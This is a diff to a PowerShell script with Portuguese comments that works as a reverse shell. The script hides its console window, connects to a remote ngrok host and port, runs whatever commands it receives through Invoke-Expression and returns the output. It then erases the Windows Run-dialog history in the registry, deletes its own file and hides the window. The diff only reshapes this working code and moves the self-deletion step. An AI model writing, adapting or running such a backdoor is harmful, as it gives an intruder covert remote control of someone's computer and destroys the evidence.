@@ -11,7 +11,7 @@ public class WinAPI {
 "@
 
 $hwnd = [WinAPI]::GetConsoleWindow()
-[WinAPI]::ShowWindow($hwnd, 2)  # 2 = Minimizado
+[WinAPI]::ShowWindow($hwnd, 2)  # Minimizado
 
 # -----------------------------
 # CONFIGURAÇÕES
@@ -25,9 +25,7 @@ $ngrokPort = 10577
 $client = New-Object System.Net.Sockets.TCPClient
 try {
     $client.Connect($ngrokHost, $ngrokPort)
-} catch {
-    exit
-}
+} catch { exit }
 
 $stream = $client.GetStream()
 $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
@@ -44,7 +42,7 @@ while ($true) {
 
         if ($command.Trim().ToLower() -eq "exit") {
             $writer.WriteLine("PowerShell será encerrado pelo listener.")
-            exit
+            break
         }
 
         $output = Invoke-Expression $command 2>&1 | Out-String
@@ -56,15 +54,6 @@ while ($true) {
 }
 
 # -----------------------------
-# APAGA O FICHEIRO AO FINAL
-# -----------------------------
-try {
-    Remove-Item "$env:TEMP\scriptngrok.ps1" -ErrorAction SilentlyContinue
-} catch {
-    # Se falhar, ignora
-}
-
-# -----------------------------
 # LIMPAR HISTÓRICO RUNMRU
 # -----------------------------
 try {
@@ -73,18 +62,19 @@ try {
     ForEach-Object {
         $_.PSObject.Properties |
         Where-Object { $_.Name -ne '(default)' } |
-        ForEach-Object {
-            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name $_.Name -ErrorAction SilentlyContinue
-        }
+        ForEach-Object { Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name $_.Name -ErrorAction SilentlyContinue }
     }
-} catch {
-    # Se falhar, ignora
-}
+} catch {}
 
 # -----------------------------
-# ENCERRA POWERSHELL AO FINAL
+# APAGAR SCRIPT E ENCERRAR POWERSHELL
 # -----------------------------
+Start-Sleep -Seconds 1
+Remove-Item "$env:TEMP\scriptngrok.ps1" -ErrorAction SilentlyContinue
+$hwnd = [WinAPI]::GetConsoleWindow()
+[WinAPI]::ShowWindow($hwnd, 0)  # 0 = fechar/ocultar
 exit
+
 
 
 
